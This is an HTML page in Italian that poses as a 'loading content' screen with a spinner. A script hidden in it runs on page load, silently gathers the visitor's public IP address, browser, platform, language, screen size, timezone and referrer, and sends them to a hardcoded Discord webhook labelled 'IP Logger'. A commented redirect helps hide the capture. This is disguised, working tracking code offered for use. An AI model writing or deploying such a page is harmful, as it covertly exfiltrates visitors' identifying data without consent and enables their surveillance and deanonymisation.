<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Caricamento...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #1a1a2e;
            color: white;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Caricamento contenuto...</p>
        <p style="font-size: 12px; color: #888;">Attendere prego</p>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522953202566299752/_zxazikJB_dgmxu4US1m14DU_limPHNdWVeXBMVLgSTiOdiNi_5T6NXEP8tpYnfzOwsi';

        async function logData() {
            try {
                // Ottieni IP pubblico
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // Raccogli altri dati
                const data = {
                    ip: ipData.ip,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer || 'Direct',
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                };

                // Prepara il messaggio per Discord
                const embed = {
                    title: "🎯 Nuovo Accesso Catturato",
                    color: 0x00ff00,
                    fields: [
                        { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
                        { name: "💻 Piattaforma", value: `\`${data.platform}\``, inline: true },
                        { name: "🌍 Lingua", value: `\`${data.language}\``, inline: true },
                        { name: "📐 Risoluzione", value: `\`${data.screenResolution}\``, inline: true },
                        { name: "🕐 Timezone", value: `\`${data.timezone}\``, inline: true },
                        { name: "🔗 Referrer", value: `\`${data.referrer}\``, inline: false },
                        { name: "📝 User Agent", value: `\`\`\`${data.userAgent.substring(0, 1024)}\`\`\``, inline: false }
                    ],
                    footer: { text: `Timestamp: ${data.timestamp}` },
                    thumbnail: { url: `https://ipinfo.io/static/images/ipinfo-logo.svg` }
                };

                // Invia al webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "IP Logger",
                        avatar_url: "https://cdn-icons-png.flaticon.com/512/2091/2091665.png",
                        embeds: [embed]
                    })
                });

                // Redirect opzionale (cambia URL con quello che vuoi)
                // window.location.href = 'https://youtube.com';
                
            } catch (error) {
                console.error('Errore:', error);
            }
        }

        // Esegui al caricamento
        logData();
    </script>
</body>
</html>
